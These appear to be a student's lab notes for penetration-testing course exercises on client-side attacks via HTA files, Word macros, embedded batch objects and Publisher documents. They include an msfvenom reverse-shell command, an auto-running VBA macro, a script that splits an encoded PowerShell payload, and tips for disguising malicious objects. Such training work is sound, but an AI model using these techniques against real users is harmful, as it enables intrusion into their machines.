# 13.2.3 Leveraging HTML Application
#### Exercises
_(To be performed on your own Kali and Windows lab client machines)_

**1.  Use msfvenom to generate a HTML Application and use it to compromise your Windows client.**

If a file is saved as with an .hta instead of an .htm extension, internet explorer will automatically interpret it as HTML and off the ability to execute using mshta.exe. Since the HTML application is being executed outside the safety of the browser, we are free to use dangerous legacy code that may normally be blocked within the browser. For the following example we are going to leverage ActiveXObjects.

The following PoC should launch the calculator in our test environment:
```
<html>
<body>

<script>

  var c= 'calc.exe'
  new ActiveXObject('WScript.Shell').Run(c);
  
</script>

</body>
</html>
```

Placing this in our html folder on our kali machine and then navigated to the poc.hta endpoint on our windows test machine and we see the following:
![[ie_poc_open.png]]

When we run the PoC we get a successful calc.exe command:
![[calc_open.png]]


Now we can move into utilizing msfvenom to alter our hta page and create a new powershell based payload. We can use the following command:
`sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/reverse.hta`

Once generated, we need to setup a listener on the specified port and navigate to the endpoint on our Windows test machine and we will get a reverse shell.

![[reverse_poc_poc.png]]
![[course notes/images/13_client_side_attacks/rev_shell.png]]

**2.  Is it possible to use the HTML Application attack against Microsoft Edge users, and if so, how?**
Yes, upon testing with Microsoft Edge the hta file was successful in obtaining a reverse shell.

![[rverse_poc_download.png]]
![[reverse_poc_run.png]]
Upon clicking "Run" we recieve our connection.
![[rev_shell2.png]]


# 13.3.3 Microsoft Word Macro
#### Exercises
**1. Use the PowerShell payload from the HTA attack to create a Word macro that sends a reverse shell to your Kali system.**

To start, we need to create a framework for our Microsoft Word macro. We use the following code as that framework:
```
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()

  CreateObject("Wscript.Shell").Run "cmd"
  
End Sub

```
This includes the AutoOpen and Document_Open procedures, which will cause the macro to run automatically.

Upon reopening the document, we see that a warning is present warning that macros are enabled.
![[enable_content.png]]

Once the victim clicks "Enable Content" our PoC macro executes and we see cmd.exe.
![[command_cmd.png]]

From here we are going to turn to Powershell in order to reuse our Metasploit shellcode. We first declare a variable called "Str".  From there we need to set our variable to the base64 encoded string of the shellcode. As VBA has a 255 character limit for strings we can split the command into multiple lines before concatenated them. To do this we will use the following python code.

```
str = "powershell.exe -nop -w hidden -e BASE64_ENCODED_SHELL....."

n = 50

for i in range(0, len(str), n):
	print "Str = Str + " + '"' + str[i:i+n] + '"'
```
We then update our macro to include this newly split shellcode and to run the variable "Str" which is set to this shellcode.
![[word_macro_shell.png]]

From here, we just need to start a listener and open the document and we recieve our reverse shell.
![[course notes/images/13_client_side_attacks/rev_shell_3.png]]

# 13.3.5 Object Linking and Embedding
#### Exercises
_(To be performed on your own Kali and Windows lab client machines)_

**1.  Use the PowerShell payload to create a batch file and embed it in a Microsoft Word document to send a reverse shell to your Kali system.**

To begin, we need to create a batch to be embedded into Microsoft Word. To do this we simply echo our base64 encoded shellcode into an object named "lanch.bat" 
![[create_payload.png]]

We then need to open Microsoft Word and insert our launch.bat object.
![[new_object.png]]

We can even change the name and icon of the malicious file to be more inconspicuous. 
![[object_rename.png]]

Once we open our Word document and launch our object we will recieve a reverse shell.
![[object_launch.png]]

# 13.3.7Evading Protected View
#### Exercises
_(To be performed on your own Kali and Windows lab client machines)_

**1.  Trigger the protection by Protected View by simulating a download of the Microsoft Word document from the Internet.**

We can trigger the Protected View by simply downloading our document from our Apache web server.
![[doc_download.png]]
![[doc_protected_view.png]]

**2.  Reuse the batch file and embed it in a Microsoft Publisher document to receive a reverse shell to your Kali system.**

Creating the object in Microsoft Publisher using our previous methods allows us to gain a reverse shell.
![[publisher_object_launch.png]]
Once the object is run we receive our connection.
![[rev_shell_4.png]]


**3.  Move the file to the Apache web server to simulate the download of the Publisher document from the Internet and confirm the missing Protected View.**

Once we move the Publisher file to our Apache server and download the file we can see that the "Protected View" is no longer present.

![[publisher_download.png]]![[publisher_object.png]]